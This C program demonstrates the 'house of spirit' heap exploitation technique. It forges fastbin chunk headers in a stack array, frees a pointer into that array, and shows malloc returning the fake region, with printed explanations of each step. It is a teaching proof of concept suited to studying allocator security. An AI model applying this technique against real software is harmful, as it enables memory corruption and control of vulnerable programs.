#include <stdio.h>
#include <stdlib.h>

int main()
{
	printf("This file demonstrates the house of spirit attack.\n");

	printf("Calling malloc() once so that it sets up its memory.\n");
	malloc(1);

	printf("We will now overwrite a pointer to point to a fake 'fastbin' region.\n");
	unsigned long long *a;
	unsigned long long fake_chunks[10] __attribute__ ((aligned (16)));

	printf("This region must contain two chunks. The first starts at %p and the second at %p.\n", &fake_chunks[1], &fake_chunks[7]);

	printf("This chunk.size of this region has to be 16 more than the the region (to accomodate the chunk data), with the 'used' bit set.\n");
	printf("... note that this has to be the size of the next malloc (plus the chunk header).\n");
	fake_chunks[1] = 0x41; // this is the size

	printf("The chunk.size of the *next* fake region also has to make sense (be small enough) to pass libc's checks. The free bit doesn't matter.\n");
	fake_chunks[9] = 0x30; // can be whatever as long as it's small enough for a fastbin

	printf("Now we will overwrite our pointer with the address of the fake region inside the fake first chunk, %p.\n", &fake_chunks[1]);
	printf("... note that the memory address of the *region* associated with this chunk (i.e., chunk+8) must be 16-byte aligned.\n");
	a = &fake_chunks[2];

	printf("Freeing the overwritten pointer.\n");
	free(a);

	printf("Now the next malloc will return the region of our fake chunk at %p, which will be %p!\n", &fake_chunks[1], &fake_chunks[2]);
	printf("malloc(0x30): %p\n", malloc(0x30));
}
